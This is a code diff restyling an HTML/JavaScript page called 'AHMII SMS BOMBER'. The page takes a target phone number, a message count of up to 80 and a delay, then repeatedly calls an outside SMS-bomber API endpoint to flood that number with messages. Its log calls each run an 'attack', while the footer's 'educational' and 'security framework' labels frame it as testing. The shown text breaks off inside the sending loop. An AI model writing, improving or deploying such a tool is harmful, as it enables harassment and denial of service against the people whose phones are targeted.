@@ -3,8 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title> AHMII SMS BOMBER | FIXED EDITION 2026 </title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,400&display=swap" rel="stylesheet">
+    <meta name="author" content="AHMII">
+    <meta name="copyright" content="AHMII 2026">
+    <title>✦ AHMII | SMS BOMBER ✦ Luxury Edition 2026</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700;800;900&family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
     <style>
         * {
@@ -14,680 +16,703 @@
         }
 
         body {
-            font-family: 'Inter', sans-serif;
-            background: radial-gradient(ellipse at 30% 20%, #0a0a0f, #020208);
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(145deg, #0a0a0f 0%, #050508 100%);
             min-height: 100vh;
             overflow-x: hidden;
+            position: relative;
         }
 
-        /* Animated Particles */
-        .particles {
+        /* Luxury Animated Background */
+        .luxury-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none;
             z-index: 0;
         }
-        .particle {
+        
+        .luxury-bg::before {
+            content: '';
             position: absolute;
-            background: rgba(0, 255, 200, 0.4);
-            border-radius: 50%;
-            opacity: 0;
-            animation: floatParticle 8s infinite;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at 30% 40%, rgba(212, 175, 55, 0.08) 0%, transparent 50%),
+                        radial-gradient(ellipse at 70% 60%, rgba(212, 175, 55, 0.05) 0%, transparent 50%);
+            animation: slowDrift 30s infinite ease-in-out;
         }
-        @keyframes floatParticle {
-            0% { opacity: 0; transform: translateY(0) scale(0.3); }
-            20% { opacity: 0.6; }
-            80% { opacity: 0.3; }
-            100% { opacity: 0; transform: translateY(-100px) scale(1); }
+        
+        @keyframes slowDrift {
+            0%, 100% { transform: translate(0, 0); }
+            33% { transform: translate(-2%, -2%); }
+            66% { transform: translate(2%, 2%); }
         }
 
-        /* Glow Background */
-        .glow-bg {
+        /* Floating Gold Orbs */
+        .gold-orb {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 30% 40%, rgba(0, 200, 150, 0.05) 0%, transparent 50%),
-                        radial-gradient(circle at 80% 70%, rgba(100, 100, 255, 0.04) 0%, transparent 50%);
-            z-index: 0;
+            border-radius: 50%;
+            filter: blur(90px);
+            opacity: 0.15;
             pointer-events: none;
+            z-index: 0;
+        }
+        .orb1 {
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(212, 175, 55, 0.6), transparent);
+            top: -200px;
+            right: -200px;
+            animation: floatGold 25s infinite;
+        }
+        .orb2 {
+            width: 450px;
+            height: 450px;
+            background: radial-gradient(circle, rgba(212, 175, 55, 0.4), transparent);
+            bottom: -180px;
+            left: -180px;
+            animation: floatGold 30s infinite reverse;
+        }
+        @keyframes floatGold {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(1.2); }
         }
 
+        /* Main Container */
         .container {
             position: relative;
-            z-index: 10;
+            z-index: 20;
             max-width: 560px;
             margin: 0 auto;
-            padding: 24px;
+            padding: 28px;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
         }
 
-        /* Header */
+        /* Header - Luxury Style */
         .header {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 45px;
         }
-        .logo {
-            font-size: 2.2rem;
+        
+        .logo-icon {
+            font-size: 3.5rem;
+            color: #D4AF37;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: gentleGlow 3s infinite;
+        }
+        
+        @keyframes gentleGlow {
+            0%, 100% { text-shadow: 0 0 10px rgba(212, 175, 55, 0.3); }
+            50% { text-shadow: 0 0 25px rgba(212, 175, 55, 0.6); }
+        }
+        
+        .logo-text {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.4rem;
             font-weight: 800;
-            letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #fff, #00ffcc, #00ff88, #fff);
-            background-size: 300% auto;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #D4AF37 0%, #F3E5AB 50%, #D4AF37 100%);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            animation: shimmer 3s linear infinite;
+            margin-bottom: 12px;
         }
-        @keyframes shimmer {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 200% 50%; }
+        
+        .logo-sub {
+            font-size: 0.7rem;
+            letter-spacing: 4px;
+            color: rgba(212, 175, 55, 0.6);
+            text-transform: uppercase;
+            font-weight: 300;
         }
-        .logo i {
-            background: linear-gradient(135deg, #00ffcc, #00ff88);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-right: 8px;
-        }
-        .badge {
-            display: inline-flex;
-            gap: 12px;
-            background: rgba(255,255,255,0.03);
-            backdrop-filter: blur(12px);
-            padding: 8px 24px;
-            border-radius: 60px;
-            margin-top: 16px;
-            border: 0.5px solid rgba(0,255,200,0.2);
-        }
-        .badge span {
-            font-size: 0.75rem;
-            font-weight: 500;
-            color: rgba(255,255,255,0.7);
-        }
-        .badge .year {
-            color: #00ffcc;
-            font-weight: 700;
+        
+        .divider {
+            width: 60px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #D4AF37, transparent);
+            margin: 20px auto 0;
         }
 
-        /* Premium Card */
-        .premium-card {
-            background: rgba(8, 8, 16, 0.7);
-            backdrop-filter: blur(24px);
-            border-radius: 48px;
-            padding: 38px 32px;
-            border: 0.5px solid rgba(0, 255, 200, 0.25);
-            transition: all 0.3s ease;
+        /* Premium Card - Pure Luxury */
+        .luxury-card {
+            background: rgba(8, 8, 14, 0.75);
+            backdrop-filter: blur(30px);
+            border-radius: 56px;
+            padding: 42px 36px;
+            border: 1px solid rgba(212, 175, 55, 0.25);
+            box-shadow: 0 35px 60px -25px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(212, 175, 55, 0.1) inset;
+            transition: all 0.4s ease;
         }
-        .premium-card:hover {
-            border-color: rgba(0, 255, 200, 0.5);
-            box-shadow: 0 20px 40px -15px rgba(0,255,200,0.15);
+        
+        .luxury-card:hover {
+            border-color: rgba(212, 175, 55, 0.5);
+            box-shadow: 0 40px 70px -25px rgba(212, 175, 55, 0.15), 0 0 0 1px rgba(212, 175, 55, 0.2) inset;
         }
 
-        /* Input Group */
+        /* Input Groups - Elegant */
         .input-group {
-            margin-bottom: 24px;
+            margin-bottom: 28px;
         }
+        
         .input-label {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-bottom: 10px;
-            font-size: 0.8rem;
+            margin-bottom: 12px;
+            font-size: 0.75rem;
             font-weight: 600;
-            color: rgba(255,255,255,0.8);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: rgba(255, 255, 255, 0.6);
         }
+        
         .input-label i {
-            color: #00ffcc;
+            color: #D4AF37;
+            font-size: 0.9rem;
         }
+        
         .input-field {
             width: 100%;
-            padding: 16px 20px;
-            background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(0,255,200,0.2);
-            border-radius: 32px;
+            padding: 16px 24px;
+            background: rgba(0, 0, 0, 0.45);
+            border: 1.5px solid rgba(212, 175, 55, 0.2);
+            border-radius: 60px;
             color: white;
             font-size: 1rem;
             font-weight: 500;
-            transition: all 0.2s;
+            font-family: 'Montserrat', monospace;
+            transition: all 0.25s;
         }
+        
         .input-field:focus {
             outline: none;
-            border-color: #00ffcc;
-            box-shadow: 0 0 15px rgba(0,255,200,0.1);
-            background: rgba(0,0,0,0.7);
+            border-color: #D4AF37;
+            box-shadow: 0 0 20px rgba(212, 175, 55, 0.15);
+            background: rgba(0, 0, 0, 0.6);
         }
+        
         .input-field::placeholder {
-            color: rgba(255,255,255,0.2);
+            color: rgba(255, 255, 255, 0.2);
+            font-weight: 400;
         }
 
-        /* Format Row */
+        /* Format Options - Gold Accents */
         .format-row {
             display: flex;
-            gap: 10px;
-            margin-top: 12px;
-            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 14px;
+            justify-content: center;
         }
-        .format-chip {
-            background: rgba(0,255,200,0.06);
-            padding: 6px 14px;
-            border-radius: 40px;
+        
+        .format-option {
+            background: rgba(212, 175, 55, 0.06);
+            padding: 7px 18px;
+            border-radius: 60px;
             font-size: 0.7rem;
             font-weight: 500;
-            color: rgba(0,255,200,0.85);
-            border: 0.5px solid rgba(0,255,200,0.2);
+            letter-spacing: 1px;
+            color: rgba(212, 175, 55, 0.8);
+            border: 0.5px solid rgba(212, 175, 55, 0.2);
             cursor: pointer;
-            transition: 0.2s;
+            transition: 0.25s;
         }
-        .format-chip:hover {
-            background: rgba(0,255,200,0.15);
-            border-color: #00ffcc;
+        
+        .format-option:hover {
+            background: rgba(212, 175, 55, 0.15);
+            border-color: rgba(212, 175, 55, 0.6);
         }
 
-        /* Buttons */
+        /* Buttons - Royal Style */
         .btn-group {
             display: flex;
-            gap: 16px;
-            margin-top: 32px;
+            gap: 18px;
+            margin-top: 36px;
         }
+        
         .btn {
             flex: 1;
-            padding: 15px 18px;
+            padding: 16px 18px;
             border: none;
-            border-radius: 100px;
-            font-size: 0.9rem;
+            border-radius: 80px;
+            font-size: 0.85rem;
             font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
             cursor: pointer;
-            transition: all 0.25s;
+            transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            font-family: 'Inter', sans-serif;
+            font-family: 'Montserrat', sans-serif;
         }
+        
         .btn-primary {
-            background: linear-gradient(105deg, #00ffaa, #00cc88);
-            color: #020208;
-            box-shadow: 0 4px 15px rgba(0,255,170,0.25);
+            background: linear-gradient(135deg, #D4AF37, #B8960F, #D4AF37);
+            background-size: 200% auto;
+            color: #0a0a0f;
+            box-shadow: 0 5px 20px rgba(212, 175, 55, 0.35);
         }
+        
         .btn-primary:hover:not(:disabled) {
-            transform: scale(1.02);
-            box-shadow: 0 8px 22px rgba(0,255,170,0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 28px rgba(212, 175, 55, 0.5);
+            background-position: 100% 0;
         }
-        .btn-danger {
-            background: rgba(255,70,90,0.12);
-            border: 0.5px solid rgba(255,70,90,0.4);
-            color: #ff6b7a;
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            color: rgba(212, 175, 55, 0.9);
         }
-        .btn-danger:hover:not(:disabled) {
-            background: rgba(255,70,90,0.22);
-            border-color: #ff6b7a;
+        
+        .btn-secondary:hover:not(:disabled) {
+            background: rgba(212, 175, 55, 0.1);
+            border-color: #D4AF37;
         }
+        
         .btn:disabled {
-            opacity: 0.5;
+            opacity: 0.4;
             cursor: not-allowed;
         }
 
-        /* Progress */
-        .progress-area {
+        /* Elegant Progress */
+        .progress-elegant {
             margin-top: 32px;
             display: none;
         }
-        .progress-bar-wrap {
-            background: rgba(255,255,255,0.05);
+        
+        .progress-track {
+            background: rgba(255, 255, 255, 0.05);
             border-radius: 60px;
-            height: 6px;
+            height: 3px;
             overflow: hidden;
         }
+        
         .progress-fill {
-            background: linear-gradient(90deg, #00ffcc, #00ff88);
+            background: linear-gradient(90deg, #D4AF37, #F3E5AB);
             width: 0%;
             height: 100%;
             border-radius: 60px;
-            transition: width 0.2s ease;
+            transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        .progress-stats {
+        
+        .progress-numbers {
             display: flex;
             justify-content: space-between;
             margin-top: 14px;
-            font-size: 0.75rem;
-            color: rgba(255,255,255,0.55);
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.45);
+            letter-spacing: 1px;
         }
-        .stat-badge {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .stat-badge i.fa-check-circle { color: #00ff88; }
-        .stat-badge i.fa-times-circle { color: #ff6b7a; }
 
-        /* Live Log */
-        .live-log {
+        /* Beautiful Message Toast */
+        .message-toast {
             margin-top: 24px;
-            background: rgba(0,0,0,0.4);
-            border-radius: 28px;
-            padding: 14px 16px;
-            max-height: 150px;
-            overflow-y: auto;
-            font-size: 0.75rem;
-            font-family: 'Inter', monospace;
-            border: 0.5px solid rgba(255,255,255,0.05);
-        }
-        .log-entry {
-            padding: 6px 0;
-            border-bottom: 0.5px solid rgba(255,255,255,0.03);
-            color: rgba(255,255,255,0.7);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .log-entry.success { color: #00ffaa; }
-        .log-entry.error { color: #ff8a9a; }
-        .log-entry i { width: 18px; }
-
-        /* Toast */
-        .result-toast {
-            margin-top: 24px;
-            padding: 14px 20px;
-            border-radius: 28px;
+            padding: 16px 24px;
+            border-radius: 60px;
             display: none;
             align-items: center;
-            gap: 12px;
-            animation: fadeSlide 0.3s ease;
+            gap: 14px;
+            animation: slideUp 0.4s ease;
+            font-size: 0.85rem;
+            font-weight: 500;
         }
-        .result-toast.show {
+        
+        .message-toast.show {
             display: flex;
         }
-        .result-toast.success {
-            background: rgba(0,255,170,0.12);
-            border: 0.5px solid rgba(0,255,170,0.4);
+        
+        .message-toast.success {
+            background: rgba(212, 175, 55, 0.12);
+            border: 0.5px solid rgba(212, 175, 55, 0.4);
+            color: #F3E5AB;
         }
-        .result-toast.error {
-            background: rgba(255,70,90,0.08);
-            border: 0.5px solid rgba(255,70,90,0.3);
+        
+        .message-toast.error {
+            background: rgba(180, 100, 100, 0.1);
+            border: 0.5px solid rgba(180, 100, 100, 0.3);
+            color: #E8C8C8;
         }
-        .result-toast i { font-size: 1.2rem; }
-        .result-toast.success i { color: #00ffaa; }
-        .result-toast.error i { color: #ff8a9a; }
-
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(8px); }
+        
+        .message-toast i {
+            font-size: 1.2rem;
+        }
+        
+        .message-toast.success i { color: #D4AF37; }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(12px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
+        /* Simple Log - Minimal Elegance */
+        .log-elegant {
+            margin-top: 28px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 48px;
+            padding: 16px 20px;
+            max-height: 130px;
+            overflow-y: auto;
+            font-size: 0.7rem;
+            font-family: 'Montserrat', monospace;
+            border: 0.5px solid rgba(212, 175, 55, 0.1);
+        }
+        
+        .log-line {
+            padding: 6px 0;
+            border-bottom: 0.5px solid rgba(255, 255, 255, 0.02);
+            color: rgba(255, 255, 255, 0.6);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .log-line.delivered { color: #D4AF37; }
+        .log-line.failed { color: rgba(200, 120, 120, 0.8); }
+        .log-line i { width: 20px; font-size: 0.7rem; }
+
+        /* Footer */
         .footer {
             text-align: center;
-            margin-top: 40px;
-            font-size: 0.7rem;
-            color: rgba(255,255,255,0.25);
-            border-top: 0.5px solid rgba(255,255,255,0.05);
-            padding-top: 24px;
+            margin-top: 48px;
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.2);
+            border-top: 0.5px solid rgba(212, 175, 55, 0.08);
+            padding-top: 28px;
+            letter-spacing: 1px;
         }
-        .footer strong {
-            color: #00ffcc;
+        
+        .footer .gold {
+            color: #D4AF37;
+            font-weight: 600;
         }
 
+        /* Responsive */
         @media (max-width: 520px) {
-            .container { padding: 16px; }
-            .premium-card { padding: 28px 22px; }
-            .logo { font-size: 1.8rem; }
-            .btn-group { flex-direction: column; }
+            .container { padding: 20px; }
+            .luxury-card { padding: 32px 24px; }
+            .logo-text { font-size: 1.8rem; }
+            .btn-group { flex-direction: column; gap: 12px; }
         }
 
-        @keyframes softPulse {
-            0% { border-color: rgba(0,255,200,0.2); }
-            50% { border-color: rgba(0,255,200,0.6); box-shadow: 0 0 0 4px rgba(0,255,200,0.05); }
-            100% { border-color: rgba(0,255,200,0.2); }
+        /* Attack Pulse */
+        @keyframes royalPulse {
+            0% { border-color: rgba(212, 175, 55, 0.2); }
+            50% { border-color: rgba(212, 175, 55, 0.7); box-shadow: 0 0 0 6px rgba(212, 175, 55, 0.05); }
+            100% { border-color: rgba(212, 175, 55, 0.2); }
         }
+        
         .attacking {
-            animation: softPulse 1.2s infinite;
+            animation: royalPulse 1.3s infinite;
+        }
+        
+        /* Hide scrollbar but keep functionality */
+        .log-elegant::-webkit-scrollbar {
+            width: 4px;
+        }
+        .log-elegant::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+        }
+        .log-elegant::-webkit-scrollbar-thumb {
+            background: #D4AF37;
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
 
-<div class="particles" id="particlesContainer"></div>
-<div class="glow-bg"></div>
+<div class="luxury-bg"></div>
+<div class="gold-orb orb1"></div>
+<div class="gold-orb orb2"></div>
 
 <div class="container">
     <div class="header">
-        <div class="logo">
-            <i class="fas fa-skull-crossbones"></i> AHMII BOMBER
+        <div class="logo-icon">
+            <i class="fas fa-crown"></i>
         </div>
-        <div class="badge">
-            <span><i class="fas fa-shield-alt"></i> ENTERPRISE</span>
-            <span class="year"> 2026 </span>
-            <span><i class="fas fa-crown"></i> PREMIUM</span>
-        </div>
+        <div class="logo-text">AHMII BOMBER</div>
+        <div class="logo-sub">SMS SECURITY FRAMEWORK</div>
+        <div class="divider"></div>
     </div>
 
-    <div class="premium-card">
+    <div class="luxury-card">
         <div class="input-group">
-            <div class="input-label"><i class="fas fa-mobile-alt"></i> TARGET NUMBER</div>
-            <input type="text" id="targetNumber" class="input-field" placeholder="923021234865 or 03021234865" value="923021234865">
+            <div class="input-label"><i class="fas fa-phone-alt"></i> TARGET NUMBER</div>
+            <input type="text" id="targetPhone" class="input-field" placeholder="923021234865" value="923021234865">
             <div class="format-row">
-                <div class="format-chip" data-format="92"> 92XXXXXXXXXX</div>
-                <div class="format-chip" data-format="03"> 03XXXXXXXXX</div>
-                <div class="format-chip" data-format="clear"> Clear</div>
+                <div class="format-option" data-val="92">🇵🇰 92XXXXXXXXXX</div>
+                <div class="format-option" data-val="03">📱 03XXXXXXXXX</div>
+                <div class="format-option" data-val="clear">🗑️ CLEAR</div>
             </div>
         </div>
 
         <div class="input-group">
-            <div class="input-label"><i class="fas fa-bolt"></i> QUANTITY</div>
-            <input type="number" id="msgAmount" class="input-field" value="5" min="1" max="100">
+            <div class="input-label"><i class="fas fa-bolt"></i> MESSAGES</div>
+            <input type="number" id="msgQty" class="input-field" value="10" min="1" max="80">
         </div>
 
         <div class="input-group">
-            <div class="input-label"><i class="fas fa-hourglass-half"></i> DELAY (ms)</div>
-            <input type="number" id="msgDelay" class="input-field" value="800" min="300" max="3000">
+            <div class="input-label"><i class="fas fa-hourglass-half"></i> DELAY (MS)</div>
+            <input type="number" id="msgDelayMs" class="input-field" value="600" min="300" max="2500">
         </div>
 
         <div class="btn-group">
-            <button id="startBtn" class="btn btn-primary"><i class="fas fa-play"></i> LAUNCH</button>
-            <button id="abortBtn" class="btn btn-danger" disabled><i class="fas fa-stop"></i> ABORT</button>
+            <button id="launchBtn" class="btn btn-primary"><i class="fas fa-feather-alt"></i> LAUNCH</button>
+            <button id="stopBtn" class="btn btn-secondary" disabled><i class="fas fa-ban"></i> ABORT</button>
         </div>
 
-        <div class="progress-area" id="progressArea">
-            <div class="progress-bar-wrap"><div class="progress-fill" id="progressFill"></div></div>
-            <div class="progress-stats">
-                <span class="stat-badge"><i class="fas fa-envelope"></i> <span id="sentCount">0</span>/<span id="totalCount">0</span></span>
-                <span class="stat-badge"><i class="fas fa-check-circle"></i> <span id="successCount">0</span></span>
-                <span class="stat-badge"><i class="fas fa-times-circle"></i> <span id="failCount">0</span></span>
+        <div class="progress-elegant" id="progressPanel">
+            <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+            <div class="progress-numbers">
+                <span><i class="far fa-envelope"></i> <span id="sentAmount">0</span>/<span id="totalAmount">0</span></span>
+                <span><i class="fas fa-check"></i> <span id="doneCount">0</span></span>
             </div>
         </div>
 
-        <div class="live-log" id="liveLog">
-            <div class="log-entry"><i class="fas fa-info-circle"></i> System ready. Enter target number.</div>
-        </div>
+        <div id="statusToast" class="message-toast"></div>
 
-        <div id="resultToast" class="result-toast"></div>
+        <div class="log-elegant" id="elegantLog">
+            <div class="log-line"><i class="fas fa-info-circle"></i> AHMII system ready — enter target</div>
+        </div>
     </div>
 
     <div class="footer">
-        <p> <strong>AHMII</strong>  CYBER TESTING FRAMEWORK  EDUCATIONAL USE </p>
-        <p>© 2026  Premium SMS Security Testing</p>
+        <p>✦ <span class="gold">AHMII</span> • CYBER SECURITY DIVISION • 2026 ✦</p>
+        <p>premium testing framework</p>
     </div>
 </div>
 
 <script>
     // DOM Elements
-    const startBtn = document.getElementById('startBtn');
-    const abortBtn = document.getElementById('abortBtn');
-    const numberInput = document.getElementById('targetNumber');
-    const amountInput = document.getElementById('msgAmount');
-    const delayInput = document.getElementById('msgDelay');
-    const progressArea = document.getElementById('progressArea');
+    const launchButton = document.getElementById('launchBtn');
+    const abortButton = document.getElementById('stopBtn');
+    const phoneField = document.getElementById('targetPhone');
+    const quantityField = document.getElementById('msgQty');
+    const delayField = document.getElementById('msgDelayMs');
+    const progressPanel = document.getElementById('progressPanel');
     const progressFill = document.getElementById('progressFill');
-    const sentSpan = document.getElementById('sentCount');
-    const totalSpan = document.getElementById('totalCount');
-    const successSpan = document.getElementById('successCount');
-    const failSpan = document.getElementById('failCount');
-    const liveLogDiv = document.getElementById('liveLog');
-    const resultToast = document.getElementById('resultToast');
+    const sentSpan = document.getElementById('sentAmount');
+    const totalSpan = document.getElementById('totalAmount');
+    const doneSpan = document.getElementById('doneCount');
+    const toastDiv = document.getElementById('statusToast');
+    const logContainer = document.getElementById('elegantLog');
 
     // State
-    let isAttacking = false;
-    let stopRequested = false;
-    let sent = 0, successTotal = 0, failTotal = 0;
-    let targetTotal = 0;
-    let activeTimers = [];
+    let isActive = false;
+    let stopSignal = false;
+    let sent = 0, delivered = 0;
+    let total = 0;
+    let activeTimout = null;
 
-    const API_URL = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=';
+    const API_BASE = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=';
 
-    // Helper Functions
-    function showToast(message, type = 'success') {
-        resultToast.className = `result-toast ${type} show`;
-        resultToast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-triangle'}"></i><span>${message}</span>`;
-        setTimeout(() => {
-            resultToast.classList.remove('show');
-        }, 4000);
+    // Helper: Show toast
+    function displayToast(msg, isOk = true) {
+        toastDiv.className = `message-toast ${isOk ? 'success' : 'error'} show`;
+        toastDiv.innerHTML = `<i class="fas ${isOk ? 'fa-gem' : 'fa-skull'}"></i><span>${msg}</span>`;
+        setTimeout(() => toastDiv.classList.remove('show'), 3500);
     }
 
-    function addLog(message, isSuccess = true) {
-        const logEntry = document.createElement('div');
-        logEntry.className = `log-entry ${isSuccess ? 'success' : 'error'}`;
-        logEntry.innerHTML = `<i class="fas ${isSuccess ? 'fa-check' : 'fa-times'}"></i> ${message}`;
-        liveLogDiv.appendChild(logEntry);
-        logEntry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        while (liveLogDiv.children.length > 45) liveLogDiv.removeChild(liveLogDiv.firstChild);
+    // Add log entry
+    function addLogEntry(text, isDelivered = true) {
+        const line = document.createElement('div');
+        line.className = `log-line ${isDelivered ? 'delivered' : 'failed'}`;
+        line.innerHTML = `<i class="fas ${isDelivered ? 'fa-crown' : 'fa-times'}"></i> ${text}`;
+        logContainer.appendChild(line);
+        line.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        while (logContainer.children.length > 45) logContainer.removeChild(logContainer.firstChild);
     }
 
-    function clearLogs() {
-        liveLogDiv.innerHTML = '<div class="log-entry"><i class="fas fa-info-circle"></i> Attack launched  tracking messages...</div>';
+    function clearLog() {
+        logContainer.innerHTML = '<div class="log-line"><i class="fas fa-info-circle"></i> attack started — tracking messages...</div>';
     }
 
-    function convertToInternational(num) {
-        let clean = num.replace(/\D/g, '');
-        if (clean.startsWith('03') && clean.length === 11) {
-            return '92' + clean.slice(1);
-        }
-        if (clean.startsWith('3') && clean.length === 10) {
-            return '92' + clean;
-        }
-        if (clean.startsWith('92') && clean.length === 12) {
-            return clean;
-        }
-        if (clean.startsWith('92') && clean.length > 12) return clean.slice(0, 12);
+    // Convert number to intl format
+    function toInternational(raw) {
+        let clean = raw.replace(/\D/g, '');
+        if (clean.startsWith('03') && clean.length === 11) return '92' + clean.slice(1);
+        if (clean.startsWith('3') && clean.length === 10) return '92' + clean;
+        if (clean.startsWith('92') && clean.length === 12) return clean;
+        if (clean.startsWith('92') && clean.length > 12) return clean.slice(0,12);
         return clean;
     }
 
-    function isValidNumber(num) {
+    function isValidInternational(num) {
         return /^92[0-9]{10}$/.test(num);
     }
 
-    async function sendMessage(number, index) {
-        const url = API_URL + number;
+    // Single API request
+    async function sendOne(number, idx) {
         try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 15000);
-            
-            const response = await fetch(url, {
-                method: 'GET',
-                signal: controller.signal,
-                headers: {
-                    'Accept': 'application/json',
-                    'Cache-Control': 'no-cache'
-                }
-            });
-            
-            clearTimeout(timeoutId);
-            const text = await response.text();
-            
-            // Check for success indicators
-            const isSuccess = response.ok || 
-                             text.toLowerCase().includes('success') || 
-                             text.includes('sent') ||
-                             text.includes('delivered');
-            
-            return { success: isSuccess, response: text };
+            const ctrl = new AbortController();
+            const timer = setTimeout(() => ctrl.abort(), 13000);
+            const res = await fetch(API_BASE + number, { signal: ctrl.signal });
+            clearTimeout(timer);
+            const text = await res.text();
+            const ok = res.ok || text.includes('success') || text.includes('sent') || text.includes('delivered');
+            return { success: ok, raw: text };
         } catch (err) {
-            console.warn(`Message ${index} error:`, err);
             return { success: false, error: err.message };
         }
     }
 
-    function updateUI() {
-        const percent = targetTotal ? (sent / targetTotal) * 100 : 0;
+    function updateProgressBar() {
+        const percent = total ? (sent / total) * 100 : 0;
         progressFill.style.width = `${percent}%`;
         sentSpan.innerText = sent;
-        totalSpan.innerText = targetTotal;
-        successSpan.innerText = successTotal;
-        failSpan.innerText = failTotal;
+        totalSpan.innerText = total;
+        doneSpan.innerText = delivered;
     }
 
     function resetUI() {
-        isAttacking = false;
-        stopRequested = false;
-        startBtn.disabled = false;
-        abortBtn.disabled = true;
-        numberInput.disabled = false;
-        amountInput.disabled = false;
-        delayInput.disabled = false;
-        document.querySelector('.premium-card')?.classList.remove('attacking');
-        // Clear any pending timers
-        activeTimers.forEach(timer => clearTimeout(timer));
-        activeTimers = [];
+        isActive = false;
+        stopSignal = false;
+        if (activeTimout) clearTimeout(activeTimout);
+        launchButton.disabled = false;
+        abortButton.disabled = true;
+        phoneField.disabled = false;
+        quantityField.disabled = false;
+        delayField.disabled = false;
+        document.querySelector('.luxury-card')?.classList.remove('attacking');
     }
 
-    async function startAttack() {
-        if (isAttacking) return;
+    async function beginAttack() {
+        if (isActive) return;
 
-        let rawNumber = numberInput.value.trim();
-        let amount = parseInt(amountInput.value);
-        let delay = parseInt(delayInput.value);
+        let rawNumber = phoneField.value.trim();
+        let amount = parseInt(quantityField.value);
+        let delayVal = parseInt(delayField.value);
 
         if (!rawNumber) {
-            showToast('Please enter a phone number', 'error');
+            displayToast('Enter target number', false);
             return;
         }
 
-        const international = convertToInternational(rawNumber);
-        if (!isValidNumber(international)) {
-            showToast('Invalid number! Use 92XXXXXXXXXX or 03XXXXXXXXX', 'error');
+        const intlNumber = toInternational(rawNumber);
+        if (!isValidInternational(intlNumber)) {
+            displayToast('Use 92XXXXXXXXXX or 03XXXXXXXXX', false);
             return;
         }
 
-        if (isNaN(amount) || amount < 1) amount = 1;
-        if (amount > 100) amount = 100;
-        if (isNaN(delay)) delay = 800;
-        if (delay < 300) delay = 300;
-        if (delay > 3000) delay = 3000;
+        phoneField.value = intlNumber;
 
-        numberInput.value = international;
-        
-        // Reset state
-        isAttacking = true;
-        stopRequested = false;
+        if (isNaN(amount) || amount < 1) amount = 5;
+        if (amount > 80) amount = 80;
+        if (isNaN(delayVal)) delayVal = 600;
+        if (delayVal < 300) delayVal = 300;
+        if (delayVal > 2500) delayVal = 2500;
+
+        // reset state
+        isActive = true;
+        stopSignal = false;
         sent = 0;
-        successTotal = 0;
-        failTotal = 0;
-        targetTotal = amount;
-        
-        startBtn.disabled = true;
-        abortBtn.disabled = false;
-        numberInput.disabled = true;
-        amountInput.disabled = true;
-        delayInput.disabled = true;
-        progressArea.style.display = 'block';
-        clearLogs();
-        updateUI();
-        
-        document.querySelector('.premium-card')?.classList.add('attacking');
-        showToast(` Attack started on ${international}`, 'success');
-        addLog(` LAUNCH  Target: ${international} | Total: ${amount} SMS`, true);
+        delivered = 0;
+        total = amount;
+
+        launchButton.disabled = true;
+        abortButton.disabled = false;
+        phoneField.disabled = true;
+        quantityField.disabled = true;
+        delayField.disabled = true;
+        progressPanel.style.display = 'block';
+        clearLog();
+        updateProgressBar();
+
+        document.querySelector('.luxury-card')?.classList.add('attacking');
+        displayToast(`✦ attack initiated → ${intlNumber} ✦`, true);
+        addLogEntry(`LAUNCH — target: ${intlNumber} · total: ${amount}`, true);
 
         for (let i = 1; i <= amount; i++) {
